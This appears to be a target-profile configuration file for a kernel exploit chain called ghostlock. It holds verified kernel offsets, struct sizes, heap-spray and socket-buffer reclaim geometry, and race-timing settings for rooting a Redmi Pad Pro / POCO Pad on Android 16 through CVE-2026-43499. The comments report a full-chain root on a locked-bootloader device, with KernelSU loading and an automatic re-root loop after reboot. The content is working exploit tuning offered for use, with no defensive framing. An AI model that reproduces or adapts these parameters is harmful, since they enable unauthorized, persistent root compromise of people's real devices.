# Redmi Pad Pro / POCO Pad (dizi, parrot/SM7435) HyperOS 3 OS3.0.308.0.WNSCNXM;
# Android 16, kernel 5.10.246-android12-9-00012-g730d06ec05ff-ab15159037,
# bootloader locked (vbstate=green). Device-gate verified (DIZI-02, 2026-11-19:
# full-chain PASS, cycle 2 attempt 8 phase 2; KernelSU late-load confirmed;
# after a deliberate reboot the reroot loop re-landed the chain ~70 s from boot).
# Source: official OTA payload.bin boot.img; CVE-2026-43499 primitive present
# (remove_waiter@0x1ecf64 still uses current). boot.img has no embedded BTF;
# offset.* from this build's recovered kallsyms (143268 syms), cross-verified
# against vmlinux-to-elf readelf (init_task/init_cred/empty_zero_page/
# root_task_group/selinux_state all match); cred.refN_image from the same
# readelf pass (root_user/init_user_ns/init_groups). Disasm-verified struct
# sizes: sizeof(mm_struct)=0x3c0 (960) via the "mm_struct"
# kmem_cache_create_usercopy call; sizeof(cred)=0xa8 (168) via cred_jar;
# task_struct.pi_lock=0x86c / pi_blocked_on=0x898 confirmed in remove_waiter.
# Geometry identical to the 5.10.236 profile (same SoC/SLUB/clang 12.0.5
# lineage): select_stack with waiter_shift=-2 (5.10 has no
# RANDOMIZE_KSTACK_OFFSET, stack geometry deterministic) + compact_waiter=1
# (the 5.10.246 W1 offset grid proved every other geometry panics at write);
# 4KB kmalloc header + order-3 full-page frag reclaim, data at page offset 0
# (sends=16, frag bias 0x180). Verification ran through the ghostlock-app port
# carrying this project's select-route fixes (batches 1/2/2c/2d/2e/3a); the
# exported GLK1 binary beside this file is byte-identical to the device-side
# verified profile (md5 f3124e6ad6932a82e1bdf448080d9c35).
release = "5.10.246-android12-9-00012-g730d06ec05ff-ab15159037"
schema_version = 1
kernel_major = 5
recommend_shizuku = 1
kernel_phys_load = 2818572288
kernel_phys_offset = null
route {
  select_stack {
    waiter_shift = -2
    compact_waiter = 1
  }
}
fallback {
  to = "none"
}
# Two-phase gate: W2 runs in a fresh process after the W1-only pass, so a
# failed attempt exits cleanly and the outer loop re-runs instead of retrying
# on a dirty heap until a walk panics and costs a reboot. Flat w2_attempts=1
# only — experimental execution overrides (e.g. race.route_wait_ms=5000)
# measurably broke the W1 race timing on device.
execution {
  stages {
    w2_attempts = 1
  }
}
kernelsnitch {
  collisions = 8
  # dizi SLUB is 64B-cacheline: disasm sizeof(mm_struct)=952 rounds to 960
  # (slab-object stride for scanning and spray step, not sizeof).
  mm_struct_sz = 960
  # Reclaim geometry (same SoC/SLUB as 5.10.236, device-gate calibrated):
  # 4KB kmalloc header + order-3 full-page frag with data at page offset 0,
  # so stream byte 4096 is the block start; sends=16 fills the window reliably.
  skb_reclaim_sends = 16
  skb_frag_bias = 384
}
